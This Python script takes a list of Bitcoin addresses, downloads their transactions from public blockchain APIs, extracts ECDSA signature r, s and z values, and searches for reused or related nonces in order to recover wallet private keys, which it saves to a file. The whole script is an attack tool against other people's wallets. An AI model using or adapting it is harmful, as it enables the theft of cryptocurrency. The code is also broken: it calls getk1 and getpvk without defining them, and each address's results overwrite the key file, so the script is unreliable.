import sys
import hashlib
import json
import argparse
from urllib.request import urlopen
import secp256k1 as ice

G = ice.scalar_multiplication(1)
N = ice.N
ZERO = ice.Zero

def get_rs(sig):
    rlen = int(sig[2:4], 16)
    r = sig[4:4+rlen*2]
    s = sig[8+rlen*2:]
    return r, s

def split_sig_pieces(script):
    sigLen = int(script[2:4], 16)
    sig = script[2+2:2+sigLen*2]
    r, s = get_rs(sig[4:])
    pubLen = int(script[4+sigLen*2:4+sigLen*2+2], 16)
    pub = script[4+sigLen*2+2:]
    assert(len(pub) == pubLen*2)
    return r, s, pub

def parse_transaction(txn):
    if len(txn) < 130:
        raise ValueError('Raw transaction data is incorrect or incomplete')
    inp_list = []
    ver = txn[:8]
    if txn[8:12] == '0001':
        raise NotImplementedError('Transaction input with witness data is not supported')
    inp_nu = int(txn[8:10], 16)
    
    first = txn[0:10]
    cur = 10
    for _ in range(inp_nu):
        prv_out = txn[cur:cur+64]
        var0 = txn[cur+64:cur+64+8]
        cur = cur+64+8
        scriptLen = int(txn[cur:cur+2], 16)
        script = txn[cur:2+cur+2*scriptLen]
        r, s, pub = split_sig_pieces(script)
        seq = txn[2+cur+2*scriptLen:10+cur+2*scriptLen]
        inp_list.append([prv_out, var0, r, s, pub, seq])
        cur = 10+cur+2*scriptLen
    rest = txn[cur:]
    return [first, inp_list, rest]

def get_raw_transaction(txid):
    try:
        htmlfile = urlopen(f"https://blockchain.info/rawtx/{txid}?format=hex", timeout=20)
    except Exception as e:
        raise ConnectionError(f"Error fetching raw transaction: {e}")
    else:
        return htmlfile.read().decode('utf-8')

def get_signable_transaction(parsed):
    res = []
    first, inp_list, rest = parsed
    tot = len(inp_list)
    for one in range(tot):
        e = first
        for i in range(tot):
            e += inp_list[i][0]
            e += inp_list[i][1]
            if one == i:
                e += '1976a914' + HASH160(inp_list[one][4]) + '88ac'
            else:
                e += '00'
            e += inp_list[i][5]
        e += rest + "01000000"
        z = hashlib.sha256(hashlib.sha256(bytes.fromhex(e)).digest()).hexdigest()
        res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
    return res

def HASH160(pubk_hex):
    return hashlib.new('ripemd160', hashlib.sha256(bytes.fromhex(pubk_hex)).digest()).hexdigest()

def inv(a):
    return pow(a, N - 2, N)

def calc_RQ(r, s, z, pub_point):
    RP1 = ice.pub2upub('02' + hex(r)[2:].zfill(64))
    RP2 = ice.pub2upub('03' + hex(r)[2:].zfill(64))
    sdr = (s * inv(r)) % N
    zdr = (z * inv(r)) % N
    FF1 = ice.point_subtraction(ice.point_multiplication(RP1, sdr), ice.scalar_multiplication(zdr))
    FF2 = ice.point_subtraction(ice.point_multiplication(RP2, sdr), ice.scalar_multiplication(zdr))
    return RP1 if FF1 == pub_point else RP2 if FF2 == pub_point else None

def diff_comb_idx(alist):
    LL = len(alist)
    return [(i, j, ice.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]

def check_transactions(address):
    txid = []
    cdx = []
    try:
        htmlfile = urlopen(f"https://mempool.space/api/address/{address}/txs", timeout=20)
        res = json.loads(htmlfile.read())
        if res is None:
            raise ValueError("No transaction data found for the specified address.")
        txcount = len(res)
        print(f'Total: {txcount} Input/Output Transactions in the Address: {address}')
        for i in range(txcount):
            vin_cnt = len(res[i]["vin"])
            for j in range(vin_cnt):
                if res[i]["vin"][j]["prevout"]["scriptpubkey_address"] == address:
                    txid.append(res[i]["txid"])
                    cdx.append(j)
    except Exception as e:
        raise ConnectionError(f"Error fetching transaction data: {e}")
    return txid, cdx

def get_r_s_z_q_lists(txid, cdx):
    rL, sL, zL, QL = [], [], [], []
    for c in range(len(txid)):
        rawtx = get_raw_transaction(txid[c])
        try:
            m = parse_transaction(rawtx)
            e = get_signable_transaction(m)
            for i in range(len(e)):
                if i == cdx[c]:
                    rL.append(int(e[i][0], 16))
                    sL.append(int(e[i][1], 16))
                    zL.append(int(e[i][2], 16))
                    QL.append(ice.pub2upub(e[i][3]))
                    print('='*70, f'\n[Input Index #: {i}] [txid: {txid[c]}]\n     R: {e[i][0]}\n     S: {e[i][1]}\n     Z: {e[i][2]}\nPubKey: {e[i][3]}')
        except Exception as e:
            print(f'Error processing transaction [{txid[c]}]:', e)
    return rL, sL, zL, QL

def find_duplicates_and_prepare_bsgs_table(rL, sL, zL, QL):
    RQ, solvable_diff = [], []
    for c in range(len(rL)):
        RQ.append(calc_RQ(rL[c], sL[c], zL[c], QL[c]))

    RD = diff_comb_idx(RQ)
    print('RQ = ')
    for i in RQ: print(f'{i.hex()}')
    print('='*70)
    print('RD = ')
    for i in RD: print(f'{i[2].hex()}')
    print('-'*120)

    for i in RD:
        if i[2] == ZERO: print(f'Duplicate R Found. Congrats!. {i[0], i[1], i[2].hex()}')

    print('='*70)
    print('-'*120)

    print(f'Starting to prepare BSGS Table with {len(RD)} elements')

    ice.bsgs_2nd_check_prepare(len(RD))

    for Q in RD:
        found, diff = ice.bsgs_2nd_check(Q[2], -1, len(RD))
        if found:
            solvable_diff.append((Q[0], Q[1], diff.hex()))

    return solvable_diff

def get_private_keys(rL, sL, zL, solvable_diff):
    private_keys = []
    for i in solvable_diff:
        k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int(i[2], 16))
        d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int(i[2], 16))
        private_keys.append(hex(d))
    return private_keys

def read_addresses_from_file(filename):
    try:
        with open(filename, 'r') as file:
            addresses = file.readlines()
            addresses = [address.strip() for address in addresses]
        return addresses
    except Exception as e:
        raise FileNotFoundError(f"Error reading file {filename}: {e}")

def write_keys_to_file(addresses, private_keys):
    try:
        with open('private_keys.txt', 'w') as file:
            for address, private_key in zip(addresses, private_keys):
                file.write(f"Address: {address}, Private Key: {private_key}\n")
    except Exception as e:
        print(f"Error writing to file: {e}")

def main(filename):
    addresses = read_addresses_from_file(filename)
    for address in addresses:
        print(f"\nProcessing address: {address}")
        txid, cdx = check_transactions(address)
        rL, sL, zL, QL = get_r_s_z_q_lists(txid, cdx)
        solvable_diff = find_duplicates_and_prepare_bsgs_table(rL, sL, zL, QL)
        private_keys = get_private_keys(rL, sL, zL, solvable_diff)
        write_keys_to_file([address]*len(private_keys), private_keys)
    print('Program Finished ...')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='This tool helps to get ECDSA Signature r,s,z values from Bitcoin Address. Also attempts to solve for privatekey using Rvalues successive differencing mathematics using bsgs table in RAM.',
                                     epilog='Enjoy the program! :) ')
    parser.add_argument("-f", "--file", help="Path to the text file containing wallet addresses, one per line", required=True)
    args = parser.parse_args()
    main(args.file)
